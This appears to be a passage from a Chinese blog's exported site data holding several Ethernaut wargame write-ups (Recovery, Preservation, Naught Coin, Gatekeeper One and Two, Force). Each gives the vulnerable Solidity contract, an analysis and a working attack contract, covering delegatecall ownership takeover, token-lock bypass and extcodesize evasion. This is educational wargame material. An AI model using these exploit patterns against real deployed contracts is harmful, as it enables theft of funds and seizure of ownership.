_initialSupply) &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens receive() external payable &#123; balances[msg.sender] = msg.value * 10; &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address payable _to) public &#123; selfdestruct(_to); &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839## 2. 分析#### tips： [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1合约地址是确定性的，可以从合约的部署者地址和来自部署者的部署交易的随机数中得出。 在这种情况下，我们从一开始就有这些信息： 1. 合同部署者地址（我们的例子，在我的例子中`0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`） 2. 部署第一个 SimpleToken 的随机数（1 如练习所述） 因此，我们可以轻松计算出第一个 SimpleToken 部署的合约地址，结果为`0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`. 从技术上讲，这里很容易作弊，因为通过检查实例合约的内部交易，很容易在区块浏览器上看到我们要排空的合约的合约地址。然而，练习的目的是我们自己推导出地址。 有了这些信息，我们现在要做的就是调用`destroy()`SimpleToken 合约中的函数，并将其中的资金定向到任何地址，以便将练习标记为已完成。- 2.2 做法：- 一旦我们有了这两个细节（部署地址，随机数），就像我在[解决方案](https://dac.ac/blog/ethernaut_solutions/#solution-15)中描述的那样，我们就可以在 python 中（或直接在 solidity 中）编写一个函数来获取地址。作为一个足智多谋的开发人员，即使我知道如何计算它，我仍然决定去 StackExchange 中找到一个现成的解决方案以跳过这个：- ``` js # compute address of a given contract to be deployed from # the deployer address + nonce, as stated in the Section 7 # of the Ethereum yellowpaper for contracts created using CREATE def mk_contract_address(sender: str, nonce: int) -&gt; str: &quot;&quot;&quot;Create a contract address using eth-utils. # Modified from Mikko Ohtamaa&#x27;s original answer which was later # edited by Utgarda # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed &quot;&quot;&quot; sender_bytes = to_bytes(hexstr=sender) raw = rlp.encode([sender_bytes, nonce]) h = keccak(raw) address_bytes = h[12:] return to_checksum_address(address_bytes) 然后，我们可以插入这些值并找到第一个 SimpleToken 部署的地址： first_simpletoken_contract_address &#x3D; mk_contract_address(recovery.address, 1) 连接到这个合约并调用destroy()函数，将资金发送到我的地址。 simpletoken.destroy(acc.address, _from) 攻击合约来自 参考视频 contract Dev &#123; function recover(address sender) external pure returns (address) &#123; address addr = address(uint160(uint256( keccak256(abi.encodePacked( bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01) )) ))); return addr; &#125; &#125; 3. 解题 3.1 获取实例地址：0x7802095a90641cd76543bc7df683d24D4bdd4436 3.2 部署Dev合约，调用合约中的recover() 函数，传入的形参为关卡实例 3.3 将调用recover() 函数 返回的地址带到区块链浏览器上查看交易 3.3 使用recover() 函数 返回的地址获取部署的SimpleToken合约，并将调用SimpleToken合约中的destroy() 函数，传入的形参为自己 的钱包地址 3.4 执行destroy() 函数之后，到区块链浏览器中再去查看地址的余额为0 3.5 提交案例 3.6 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Preservation","slug":"Smart contracts/ethernaut/Preservation","date":"2023-01-18T09:10:10.000Z","updated":"2023-01-18T09:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Preservation/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Preservation/","excerpt":"","text":"Preservation1.题目要求 1.1 该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。 通关条件：尝试取得合约的所有权（owner）。 可能有帮助的注意点： 深入了解 Solidity 官网文档中底层方法 delegatecall 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。 理解 delegatecall 的上下文保留的含义 理解合约中的变量是如何存储和访问的 理解不同类型之间的如何转换 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;)); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); &#125; &#125; // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 123456789101112131415161718192021222324## 2. 分析#### [参考文章1](https://stermi.medium.com/the-ethernaut-challenge-16-solution-preservation-bc2fe5abec4d) [参考文章2](https://dac.ac/blog/ethernaut_solutions/#delegation)#### 第一类分析方法- 2.1 目标：声明对给定实例的所有权- 2.2 它有一个`uint256 storedTime`状态变量和一个 setter 函数`setTime`，可以根据用户的输入更新状态变量。- ```solidity // Simple library contract to set the time contract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125; &#125; 2.3 分析主函数的代码 它有五个不同的状态变量 address public timeZone1Library第一时区图书馆地址 address public timeZone2Library第二时区图书馆地址 address public owner所有者的地址 uint256 storedTime两个时区库之一存储的时间 bytes4 constant setTimeSignature``setTime时区库中函数的签名。constant由于关键字，这不是真正的状态变量 合约的the constructorof the contract 采用两种address类型的输入来设置两个库地址并将所有者设置为msg.sender. 然后我们有两个不同的功能 function setFirstTime(uint256 _timeStamp) public function setSecondTime(uint256 _timeStamp) public 它们是相同的，它们只是在两个不同的时区库上执行相同的代码 当Preservation合约执行时setFirstTime(100)，它会调用LibraryContract.setTime(100)via delegatecall。 执行的代码来自合约LibraryContract，但使用的上下文是执行操作码的上下文delegatecall。当我们谈论上下文时，我们指的是存储、当前发送者( msg.sender) 和当前值( msg.value)。 如果**LibraryContract**修改状态，它不会修改自己的状态，而是修改调用者（**Preservation**）的状态！这意味着当LibraryContract.setTime更新storedTime状态变量时，不是从它自己的合约更新变量，而是更新调用者合约的slot0中的变量，即timeZone1Library地址。 setSecondTime执行函数时会发生同样的事情，它将更新合约slot0Preservation中的变量。 我们如何利用这个漏洞？有没有办法修改delegatecall存储状态变量信息的第三个存储槽owner？ 好吧，不是直接来自setFirstTime，否则会修改slot0setSecondTime变量的值。但是，如果我们将slot0地址替换为我们已部署的合约的地址，这将模拟相同的布局存储并且确实会更新slot3变量怎么办？ 第二类分析方法 保存合约使用地址中分配的合约timeZone1Library和timeZone2Library库合约。因此，对这些合约的所有调用都是在保存合约中完成的delegatecall，不会触及每个合约的存储LibraryContract，而是触及保存合约的存储。 当我们storedTime通过库合约中的函数修改变量时，我们不是在库或保存合约中修改delegatecall，而是在保存合约中占用相应存储槽的变量。setTime()``storedTimestoredTime 因此，调用setFirstTime()orsetSecondTime()将timeZone1Library使用我们作为 传递的任何值进行修改_timeStamp。因此，为了利用合约并成为owner，我们需要部署一个与Preservation 具有相同存储布局的合约，这意味着我们的攻击者合约应该定义： 123address public timeZone1Library;address public timeZone2Library;address public owner; 与保存的顺序完全相同。 此外，攻击者合约中必须定义两个附加功能： 一个setTime()带有uint256参数的函数，在攻击者合约的情况下，它将修改其第三个内存槽中的变量，因此owner。这个变量的名称无关紧要，因为我们只对修改 Preservation 中的第 3 个内存槽感兴趣，但为了保持一致，我也将其命名为owner。 123function setTime(uint256) public &#123; owner = tx.origin;&#125; 在保护中调用的函数setFirstTime()，以使timeZone1Library攻击者签订合同。如果每个 LibraryContract 都使用与 Preservation 相同的布局进行正确编码，则 Preservation 合约不会以这种方式受到攻击。 123function setFirstTimeExploit() external &#123; preservationContract.setFirstTime(uint256(address(this)));&#125; preservationContract保存合同的接口在哪里。 因此流程如下： 通过从攻击者合约调用来创建攻击者合约timeZone1Library地址setFirstTime()。 使用setFirstTime()任何无符号整数作为参数调用保存合约，该合约setTime()在攻击者合约中执行，生成owner我们的原始地址。 参考视频 写的攻击合约 contract Hack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; function attack(Preservation target) external &#123; target.setFirstTime(uint256(uint160(address(this)))); target.setFirstTime(uint256(uint160(msg.sender))); require(target.owner() == msg.sender, &quot;hack failed&quot;); &#125; function setTime(uint _owner) external &#123; owner = address(uint160(_owner)); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x5E4d571ae5dAA2A4D530a1a5B89C11d6fEae8440 3.2 部署攻击合约，调用Hack 合约中的attack() 函数，形参是实例地址 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Naught Coin","slug":"Smart contracts/ethernaut/Naught Coin","date":"2023-01-18T07:10:10.000Z","updated":"2023-01-18T07:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Naught Coin/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Naught%20Coin/","excerpt":"","text":"Naught Coin1. 题目要求 1.1 NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。 这可能有用 ERC20标准 OpenZeppelin仓库 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &#39;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&#39;; contract NaughtCoin is ERC20 &#123; // string public constant name = &#39;NaughtCoin&#39;; // string public constant symbol = &#39;0x0&#39;; // uint public constant decimals = 18; uint public timeLock = block.timestamp + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123; player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(block.timestamp &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; 1234567891011121314151617181920212223242526## 2. 分析- 2.1 通过让您的代币余额为 0 来完成此级别- 2.2 ***tips：\\****在*`*constructor*`*.* `*_mint*`*在执行合约*`*emit*`*事件**后*`*Transfer*`*，不知道 OpenZeppelin*`*_mint*`*函数的本机实现已经是*`*emit*`*事件*`*Transfer*`- 要解决这个合约，我们需要知道 ERC20 代币的 EIP（以太坊改进提案）是如何工作的，以及 OpenZeppelin 是如何实现它的（该合约使用的是 OpenZeppelin 框架库）。 您可以从这些链接中找到所需的所有信息： - [以太坊 EIP-20](https://eips.ethereum.org/EIPS/eip-20) - [OpenZeppelin ERC20 文档](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20) - [OpenZeppelin ERC20 实现](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol) 转移代币有两种方式： - 通过`transfer`允许`msg.sender`直接将代币转移到`recipient` - 通过`transferFrom`允许外部任意`sender`（可能是代币本身的所有者）代表所有者将`amount`代币转移到`recipient`. 在发送这些代币之前，所有者必须已**批准**管理`sender`该数量的代币 因为`transfer`方法已经`overrided`约定好了`NaughtCoin`，我们可以使用函数来规避限制`transferFrom`。 这是我们需要做的： 1) 创建一个二级账户，将我们所有的代币转移到 2) 在调用之前批准我们自己管理全部代币`transferFrom`3) 调用`transferFrom(player, secondaryAccount, token.balanceOf(player))`4) 随心所欲地使用代币！ NaughtCoin`合约应该实施什么才能真正锁定我们的代币**10 年**？他们可以实现EIP-20 定义的**一个挂钩**`overriding`，称为.`transfer``_beforeTokenTransfer 12345678910111213141516171819202122232425 当发生任何类型的令牌传输时，将调用此挂钩： - `mint`（从地址转移`0x`到用户） - `burn`（从用户转移到`0x`地址） - `transfer` - `transferFrom` 通过这样做，他们可以防止这种利用。- 2.3 [参考视频](https://www.youtube.com/watch?v=f4QDmG2Cgc0) 写的攻击合约- ```solidity interface INaughtCoin &#123; function player() external view returns (address); &#125; contract Hack &#123; function pwn(IERC20 coin) external &#123; address player = INaughtCoin(address(coin)).player(); uint bal = coin.balanceOf(player); coin.transferFrom(player, address(this), bal); &#125; &#125; 2.4 解题步骤为： // 1.Deploy // 2.coin.approve(hack, amount) // 3.pwn() 3. 解题 3.1 获取关卡实例地址：0x34df3070B62B46bCBc4d0a2cbCcd670109041b8a 3.2 部署攻击合约 Hack 3.3 根据关卡实例地址 生成 IECR20 合约 3.4 调用IECR20 合约中的balanceOf() 函数查看当前账户余额 3.5 再调用IECR20 合约的approve() 函数，传入Hack 合约地址和 所查账户余额 3.6 调用Hack 合约中的pwn() 函数 传入关卡实例 3.7 回到IECR20 合约中调用balanceOf() 函数查看当前账户余额 3.8 提交实例 3.9 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper Two","slug":"Smart contracts/ethernaut/GatekeeperTwo","date":"2023-01-09T05:02:15.000Z","updated":"2023-01-09T05:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/GatekeeperTwo/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/GatekeeperTwo/","excerpt":"","text":"Gatekeeper Two1. 题目要求 1.1 题目：这个守门人带来了一些新的挑战, 同样的需要注册为参赛者来完成这一关 这可能有帮助: 想一想你从上一个守门人那学到了什么. 第二个门中的 assembly 关键词可以让一个合约访问非原生的 vanilla solidity 功能. 参见 here . extcodesize 函数可以用来得到给定地址合约的代码长度 - 你可以在这个页面学习到更多 yellow paper. ^ 符号在第三个门里是位操作 (XOR), 在这里是代表另一个常见的位操作 (参见 here). Coin Flip 关卡也是一个很好的参考. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 1234567891011121314## 2. 分析- 2.1 与 Gatekeeper One 一样，我们必须成功通过函数的 3 次修饰符检查`enter()`才能创建`entrant`我们的地址- 2.2 交易必须从合约发送，以便合约地址 ( `msg.sender`) 与合约调用者 ( `tx.origin`) 不同。- `msg.sender`和`tx.origin`- ![image-20230225003313354](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020023378.png)- 在函数调用者上运行 solidity 汇编操作码的结果`extcodesize()`返回调用者合约代码的长度，但是，当我们从合约调用的构造函数执行外部调用时，`extcodesize()`返回零，因为合约在构造期间没有可用的源代码. Consensys 智能合约最佳实践页面中的[此页面详细介绍了它。](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)因此，这`extcodesize()`不是检查外部调用是由合约还是外部拥有的帐户执行的可靠方法。我们在这里要做的就是运行`enter()`从调用合约的构造函数调用函数的代码。- 按位`XOR`和通过它操作的每个元素都是它自己的逆，所以如果我们有如果：```jsuint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 为真，则： 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) 也是如此。因此，*我们不需要_gateKey*，我们可以简单地将结果uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1作为参数传递，enter()但强制转换为bytes8as 这就是所enter()需要的。 参考博客 门 1：msg.sender和tx.origin 要打开这扇门，我们必须了解msg.sender它们tx.origin之间的区别。 让我们看看 Solidity 文档对这些全局变量的看法： msg.sender( address): 消息的发送者（当前通话） tx.origin( address): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互A，然后B通过直接调用（而不是 a delegatecall）与另一个合约交互，那么这些值将不同。 在这种情况下： msg.sender将有 EOA 地址 tx.origin``A将有合同的地址 因为为了gateOne不恢复，我们需要让msg.sender != tx.origin这意味着我们必须enter从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践tx.orgin以及何时不应使用它的内容。 关卡2：背后的玄机extcodesize 第二个门是了解更多关于合约如何部署以及合约在部署过程中的生命周期的绝好机会。 让我们看看函数的代码： 12345678修饰符 gateTwo() &#123; uint256 x; 程序集 &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; 如果这是您第一次看到关键字assembly ，请不要害怕。这就是 Solidity 允许您使用称为Yul. 这里不是讨论这个话题的地方，但如果您想了解更多， Solidity 文档网站上有大量关于 Yul 的内容。 让我们看看这两个操作码在执行时做了什么： CALLER操作码返回调用者帐户的 20 字节地址。这是执行最后一次调用的帐户（委托调用除外）。 EXCODESIZE操作码在执行时返回作为参数传递的地址的代码大小（以字节为单位）。 这个门要求的code大小caller必须是0。 如果caller是一个总是返回零的 EOA（外部拥有账户），但事实并非如此，因为正如我们所说，msg.sender由于第一门要求，调用者 ( ) 必须是智能合约。 智能合约如何实现零代码？好吧，这是真的有一个特例。智能合约在编译时有两种不同的字节码。 创建字节码是以太坊创建合约和只执行一次构造函数所需的字节码 运行时字节码是合约的真实代码，存储在区块链中的代码将用于执行您的智能合约功能 当执行构造函数初始化合约存储时，它返回运行时字节码。直到构造函数的最后，合约本身没有任何运行时字节码，这意味着如果你调用address(contract).code.length它会返回0！ 如果您想在 EVM 级别阅读更多相关信息，可以深入阅读 OpenZeppelin 博客文章解构 Solidity 合约——第二部分：创建与运行时 因此，要通过第二道门，我们只需要从智能合约enter中调用即可！Exploiter``constructor Gate 3：铸造、向下铸造和位运算 最后一扇门是另一扇让你大吃一惊的门。你准备好了吗？ 我们再次讨论类型和位运算之间的转换 来看看需求uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 合约是用0.8.x之前的Solidity版本编译的，所以在执行数学运算时不会回滚uint64(0) - 1。此操作是表达“给我 auint64可以容纳的最大数量”的“旧方法”。你可以通过做来表达同样的事情type(uint64).max。 该部分从（在这种情况下是合同）中bytes8(keccak256(abi.encodePacked(msg.sender)))获取不太重要的内容并将它们转换为8 bytes``msg.sender``Exploiter``uint64 该指令a ^ b是按位XOR操作。操作XOR是这样的：如果 position 中的位相等，它将导致0otherwise in a 1。使a ^ b = type(uint64).max（所以所有1）b必须是的倒数a。 这意味着我们gateKey必须是bytes8(keccak256(abi.encodePacked(msg.sender))) 在 solidity 中，没有“反向”操作，但我们可以通过XOR在输入和值之间进行操作来重新创建它F，其中只有 s。 这意味着我们可以gateKey通过执行来计算正确的bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF 2.3 参考视频 写的攻击合约 contract Hack &#123; constructor(GatekeeperTwo target) &#123; uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); uint64 k = s ^ type(uint64).max; bytes8 key = bytes8(k); require(target.enter(key), &quot;failed&quot;); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0xf0f0bbA56D2035804D70D9Ed802e422195b62134 3.2 通过传入实例的地址部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Force","slug":"Smart contracts/ethernaut/Force","date":"2023-01-09T03:32:10.000Z","updated":"2023-01-09T03:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Force/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Force/","excerpt":"","text":"Force1. 题目要求 1.1 题目： 这一关的目标是使合约的余额大于0 这可能有帮助: Fallback 方法 有时候攻击一个合约最好的方法是使用另一个合约. 阅读上方的帮助页面, “Beyond the console” 部分 1.2 要求： 使合约的余额大于0 1.3 合约代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Force &#123;/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =ø= / (______)__m_m) */&#125; 123456789101112131415161718192021## 2. 分析- 2.1 我看到这个合约首先是挺无语的哈哈哈哈🤣🤣🤣- 2.2 合约中没有没有fallback和receive函数接收以太，也没有任何一个payable的函数可以接收以太，所以我们只能强制给该合约打钱- 2.3 由于合约中什么都没有，所以我们唯一能解决这个挑战的就是使用方法`selfdestruct()`- 2.4 selfdestruct()函数的解释： `selfdestruct`命令可以用来删除智能合约，并将该合约剩余`ETH`转到指定地址。`selfdestruct`是为了应对合约出错的极端情况而设计的。它最早被命名为`suicide`（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为`selfdestruct`。- selfdestruct() 函数的使用：- ![image-20230224170947882](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020022611.png)- 2.5 攻击合约- ```solidity contract Exploiter &#123; constructor(address payable _to) public payable &#123; // 自毁时将所有的 `msg.value` 重定向到 `to` selfdestruct(_to); &#125; &#125; 部署Exploiter合约, 构造器默认将Expoliter合约的余额转给 _to 地址 3. 解题 3.1 获取关卡实例地址：0x896317e85Fb12eA5bAD846A59870f3F672fAB7A4 3.2 部署攻击合约，并在部署时填入关卡实例地址 3.3 调用Deploy() 函数 3.4 调用实例部署的合约查看合约余额，结果 balance &gt; 0 3.5 提交案例，并查看返回结果 3.6 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Gatekeeper One","slug":"Smart contracts/ethernaut/Gatekeeper One","date":"2023-01-09T03:02:15.000Z","updated":"2023-01-09T03:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Gatekeeper One/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One1. 题目要求 1.1 越过守门人并且注册为一个参赛者来完成这一关. 这可能有帮助: 想一想你在 Telephone 和 Token 关卡学到的知识. 你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 here 和 here). 1.2 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(gasleft() % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243## 2.分析#### tips：[参考博客](https://stermi.medium.com/the-ethernaut-challenge-13-solution-gatekeeper-one-7587bfb38550)- 2.1让我们把解释分成三个不同的部分 门 1：`msg.sender`和`tx.origin` 要打开这扇门，我们必须了解`msg.sender`它们`tx.origin`之间的区别。 [让我们看看 Solidity 文档对这些全局变量的](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)看法： - `msg.sender`( `address`): 消息的发送者（当前通话） - `tx.origin`( `address`): 交易的发送方（完整的调用链） 当交易由 EOA 进行并直接与智能合约交互时，这些变量将具有相同的值。但是，如果它与中间人合约交互`A`，然后`B`通过直接调用（而不是 a `delegatecall`）与另一个合约交互，那么这些值将不同。 在这种情况下： - `msg.sender`将有 EOA 地址 - `tx.origin``A`将有合同的地址 因为为了`gateOne`不恢复，我们需要让`msg.sender != tx.origin`这意味着我们必须`enter`从智能合约而不是直接从玩家的 EOA 调用。 这不是挑战的一部分，但我建议您阅读我在进一步阅读中列出的关于一些安全问题和最佳实践`tx.orgin`以及何时**不应**使用它的内容。 2号门：`gasleft()` [从关于全局变量](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)的 Solidity 文档中我们知道这是一个返回交易**剩余气体**`gasleft() returns (uint256)`的函数。 重要的是要知道每个 Solidity 指令实际上是一系列低级 EVM 操作码的高级表示。执行操作码后`GAS`（在[EVM 代码文档站点](https://www.evm.codes/#5a)上阅读更多内容），返回值是执行**后**剩余的气体量，也是`GAS`当前消耗**2 gas**的操作码。 事情在这里变得过于复杂，因为要通过检查，`gateTwo`您必须调用`level.enter&#123;gas: exactAmountOfGas&#125;(gateKey)`非常特定数量的气体，以便`gasleft().mod(8191)`返回`0`（剩余的气体必须是 8191 的倍数）。 你猜不到这个数字，因为你需要翻译 EVM 操作码中的所有 Solidity 代码，计算它们各自消耗的 gas 并浪费大量时间（除非你的目标也是掌握 EVM，但对于这个主题有还有大量其他资源，例如[让我们玩 EVM 谜题——边玩边学习以太坊 EVM！](https://stermi.medium.com/lets-play-evm-puzzles-learning-ethereum-evm-while-playing-43a8354a02b3)）。您还需要记住，gas 成本可能会有所不同，具体取决于使用哪个 Solidity 编译器版本将代码编译为字节码以及在此过程中使用了哪些编译标志。一团糟。 我们可以做什么？好吧，我们可以用简单的方法去**暴力破解它！**按照[cmichel 的](https://cmichel.io/ethernaut-solutions/)建议，我们可以利用我们正在使用本地测试环境（或分叉的环境）这一事实。 我们知道交易使用的 gas`enter`必须至少为 8191 加上执行这些操作码所花费的所有 gas。我们可以进行范围猜测并对其进行暴力破解，直到它起作用为止。这是代码示例： for (uint256 i = 0; i &lt;= 8191; i++) &#123; try victim.enter&#123;gas: 800000 + i&#125;(gateKey) &#123; console.log(&quot;passed with gas -&gt;&quot;, 800000 + i); break; &#125; catch &#123;&#125; &#125; 123456789101112131415161718192021222324252627282930313233 你从一个基本的 gas 值开始只是为了确保交易不会因为 Out of Gas 异常而恢复，然后你试图找到哪个 gas 值可以使交易成功。 在我们的例子中（solidity 编译器 + 优化标志）正确的 gas 值是：**802929** 关卡 3：铸造如何在 Solidity 中工作 要解决最终关口，我们首先需要了解从一种类型到另一种类型的转换以及向下转换的工作原理。Solidity 文档对其进行了很好的解释： - [Solidity 文档：基本类型之间的转换](https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types) - [Solidity 文档：文字和基本类型之间的转换](https://docs.soliditylang.org/en/latest/types.html#conversions-between-literals-and-elementary-types) 当您从较小的类型转换为较大的类型时，没有问题。所有的高位都用零填充，值不变。问题是当您将较大的类型转换为较小的类型时。根据值的不同，您可能会遇到数据丢失的情况，因为那些高阶位会丢失并被截断。例如，`uint16(0x0101)`是`257`十进制的，但如果你向下转换它，`uint8`它将是`1`十进制的！- 2.2 [参考视频](https://www.youtube.com/watch?v=hOQWIIx5SRc) 写的攻击合约- ```solidity interface IGateKeeperOne &#123; function entrant() external view returns (address); function enter(bytes8) external returns (bool); &#125; contract Hack &#123; function enter (address _target, 